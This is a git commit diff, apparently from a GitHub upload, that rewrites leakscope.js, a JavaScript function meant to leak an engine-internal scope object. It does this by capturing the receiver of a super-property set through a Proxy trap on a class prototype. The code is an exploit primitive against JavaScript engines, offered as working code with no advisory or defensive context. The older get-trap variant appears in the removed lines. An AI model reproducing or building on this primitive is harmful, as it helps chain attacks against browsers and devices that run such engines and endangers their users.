afb0bfc079644b128b3b83832ab426b89a8ce138
dumbButSkilledDev <111146406+dumbButSkilledDev@users.noreply.github.com>
2025-07-04 13:00:28 -0700

    Add files via upload

--- leakscope.js
+++ leakscope.js
@@ -1,31 +1,27 @@
 function leakScope() {
     try {
+        let receiver = null;
+
         class Leaker {
             leak() {
-                return super.foo;
+                super.foo = {};
+                return receiver;
             }
         }
 
         Leaker.prototype.__proto__ = new Proxy({}, {
-            get(target, propertyName, receiver) {
-                log("[proxy trap] target: " + target + ", property: " + propertyName);
-
-                // Add Symbol.toPrimitive to receiver so it doesn't throw
-                receiver[Symbol.toPrimitive] = function(hint) {
-                    log("coercing receiver to primitive with hint: " + hint);
-                    return "dummy"; // Just return a harmless string
-                };
-
-                return receiver;
+            set(target, property, value, _receiver) {
+                receiver = _receiver;
+                return true;
             }
         });
 
         const foo = 42;
         const { leak } = Leaker.prototype;
 
-        let res = (() => leak())();
-        log("scope leak success: " + res);
-        return res;
+        let result = (() => leak())();
+        log("leakScope() returned receiver: " + result);
+        return result;
     } catch (e) {
         log("leakScope() threw: " + e);
         return null;
